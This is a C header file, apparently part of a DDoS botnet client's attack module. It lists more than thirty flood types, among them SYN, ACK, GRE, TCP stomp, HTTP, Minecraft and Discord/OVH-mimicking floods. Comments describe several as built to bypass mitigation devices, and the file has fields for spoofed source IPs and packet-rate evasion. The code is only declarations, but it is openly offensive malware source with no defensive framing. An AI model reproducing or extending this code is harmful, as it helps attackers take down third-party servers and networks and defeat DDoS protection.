#pragma once


#ifdef DEBUG
#endif

#include "../../utils/headers/includes.h"
#include "../../utils/headers/checksum.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/util.h"
#include "../../encryption/chacha20_table.h"
#include "../../utils/headers/protocol.h"
#include "../debug.h"

#define MAX_PACKET_SIZE 4096
#define ATTACK_CONCURRENT_MAX 50

#define MAX_FDS 1000

struct flood
{
    struct flood_target *targets;
    struct flood_settings *settings;
    struct flood_flag *options;
    uint8_t num_of_options;
    uint8_t num_of_targets;
    uint16_t duration;
    volatile int *running;
};

struct flood_target
{
    struct sockaddr_in sock_addr;
    uint32_t addr;
    uint8_t netmask;
};

struct flood_settings
{
    int dest_port, tcp_dest_port, source_port;
    int length, min_length, max_length;
    int random_data;                             // Randomize payload after each packet? Default is true.
    int syn, ack, urg, psh, rst, fin;            // TCP header flags.
    int seq_rnd, ack_seq_rnd;                    // TCP sequences, default is random.
    int tos, ttl, ident, dont_fragment;          // IP header fields.
    int const_ip;                                // Should the encapsulated destination address be the same as the target?
    int min_pps, max_pps, sleep, csleep, repeat; // Bypass options
    uint32_t source_ip;                          // Source IP used to spoof ip(s).
    char *payload;                               // Custom payload.
};

struct flood_flag
{
    uint8_t id;
    uint8_t val_len;
    char *val;
};

struct tcpbypass_state
{
    int fd;
    int state;
    uint32_t timeout;
};

typedef void (*FLOOD_FUNC)(struct flood *);

enum
{
    FLOOD_UDPPLAIN = 0,   // UDP socket flood with custom payload & min / max packet length.
    FLOOD_UDPRAW = 1,     // UDP RAW flood.
    FLOOD_TCPBYPASS = 2,  // TCP socket flood designed to bypass mitigation devices.
    FLOOD_SYN = 3,        // TCP SYN flood with no packet length.
    FLOOD_ACK = 4,        // TCP ACK flood with custom payload & min / max packet length.
    FLOOD_SYNDATA = 5,    // TCP SYN flood with custom payload & min / max packet length.
    FLOOD_SOCKET = 6,     // TCP 3-way handshake flood with subnet support designed to bypass mitigation devices.
    FLOOD_SOCKETHOLD = 7, // TCP socket hold flood with subnet support designed to max out connections.
    FLOOD_TFO = 8,        // TCP Fast Open flood designed to bypass mitigation devices.
    FLOOD_WRA = 9,        // TCP flood with randomized TCP headers.
    FLOOD_GREIP = 10,     // Layer 3 GRE IP flood.
    FLOOD_STOMP = 11,     // TCP stomp flood.
    FLOOD_HANDSHAKE = 12, // TCP handshake flood.
    FLOOD_STD = 13,       // Standard socket flood.
    FLOOD_UDPBYPASS = 14, // UDP bypass flood.
    FLOOD_STOMPBIG = 17,  // TCP stompbig flood based on 100upv15.
    FLOOD_GREACK = 21,    // GRE-encapsulated TCP ACK flood.
    FLOOD_OVHUDP = 22,    // Specialized UDP flood with Discord mimicry.
    FLOOD_DISCORD = 23,   // Dedicated Discord protocol flood.
    FLOOD_SHAND = 24,     // Handshake by LORIKAZ TCP flood.
    FLOOD_OVHTCP = 25,    // Legitimate TCP socket OVH payload mimic flood.
    FLOOD_VSE = 26,
    FLOOD_HTTP = 27,
    FLOOD_HTTPS = 28,
    FLOOD_MCCPS = 29,
    FLOOD_MCPING = 30,
    FLOOD_MCHANDSHAKE = 31,
    FLOOD_MCJOIN = 32,
    FLOOD_ACKBYPASS = 33,
    FLOOD_ICMP = 34,
};

enum
{
    OPT_PAYLOAD_SIZE = 0, // What should the size of the packet data be?
    OPT_PAYLOAD_RAND = 1, // Should we randomize the packet data contents?
    OPT_IP_TOS = 2,       // tos field in IP header
    OPT_IP_IDENT = 3,     // ident field in IP header
    OPT_IP_TTL = 4,       // ttl field in IP header
    OPT_IP_DF = 5,        // Dont-Fragment bit set
    OPT_SPORT = 6,        // Should we force a source port? (0 = random)
    OPT_DPORT = 7,        // Should we force a dest port? (0 = random)
    OPT_URG = 11,         // TCP URG header flag
    OPT_ACK = 12,         // TCP ACK header flag
    OPT_PSH = 13,         // TCP PSH header flag
    OPT_RST = 14,         // TCP RST header flag
    OPT_SYN = 15,         // TCP SYN header flag
    OPT_FIN = 16,         // TCP FIN header flag
    OPT_SEQRND = 17,      // Should we force the sequence number? (TCP only)
    OPT_ACKRND = 18,      // Should we force the ack number? (TCP only)
    OPT_GRE_CONSTIP = 19, // Should the encapsulated destination address be the same as the target?
    OPT_SOURCE = 25,      // Source IP
    OPT_RAND_LEN = 26,    // random packet len
    OPT_MIN_LEN = 27,     // random packet len
    OPT_MAX_LEN = 28,     // random packet len
    OPT_PAYLOAD = 29,     // random packet len
    OPT_REPEAT = 30,
    OPT_CSLEEP = 31,
    OPT_MINPPS = 32,
    OPT_MAXPPS = 33,
    OPT_SLEEP = 34,
    OPT_TCP_DEST_PORT = 35,
    OPT_PSHTIMES = 37,    // Number of PSH packets per session
    OPT_FINIGNORE = 38,   // Ignore FIN packets?
    OPT_CHECK_INTERVAL = 39,
    OPT_RESTART_THRESHOLD = 40,
    OPT_HTTP_PATH = 41,
    OPT_HTTP_HOST = 42,
    OPT_HTTP_METHOD = 43,
    OPT_HTTP_USERAGENT = 44,
    OPT_THREADS = 45,
    OPT_CONNS = 46,
    OPT_DOMAIN = 47,
    OPT_MC_VERSION = 48,
};

struct flood_info
{
    FLOOD_FUNC func;
    uint8_t id;
};

struct stomp_data
{
    uint32_t addr;
    uint32_t seq, ack_seq;
    uint16_t sport, dport;
};

int floods_init(void);
void killall_attacks(void);

void flood_parse(char *, int);
void flood_start(uint8_t, struct flood_flag *, uint8_t, struct flood_target *, uint8_t, uint16_t);
FLOOD_FUNC retrieve_flood(int);

char *get_option_string(uint8_t, struct flood_flag *, uint8_t, char *);
char *get_option_hex_string(uint8_t, struct flood_flag *, uint8_t, char *);
int get_option_number(uint8_t, struct flood_flag *, uint8_t, int);
uint32_t get_option_ip(uint8_t, struct flood_flag *, uint8_t, uint32_t);

/* Actual attacks */
void flood_udpraw(struct flood *);
void flood_udpplain(struct flood *);
void flood_std(struct flood *);
void flood_udpbypass(struct flood *);

void flood_udpvse(struct flood *);
void flood_std(struct flood *);

void flood_greip(struct flood *);

void flood_syn(struct flood *);
void flood_ack(struct flood *);
void flood_syndata(struct flood *);

void flood_stomp(struct flood *);
void flood_stompbig(struct flood *);
void flood_tfo(struct flood *);
void flood_tcpbypass(struct flood *);
void flood_wra(struct flood *);
void flood_socket(struct flood *);
void flood_sockethold(struct flood *);
void flood_handshake(struct flood *);
void flood_greack(struct flood *);
void flood_ovhudp(struct flood *);
void flood_discord(struct flood *);
void flood_shand(struct flood *);
void flood_ovhtcp(struct flood *);
void flood_http(struct flood *);
void flood_https(struct flood *);
void flood_mccps(struct flood *);
void flood_mcping(struct flood *);
void flood_mchandshake(struct flood *);
void flood_mcjoin(struct flood *);
void flood_ackbypass(struct flood *);
void flood_icmp(struct flood *);

static void add_flood(uint8_t, FLOOD_FUNC);
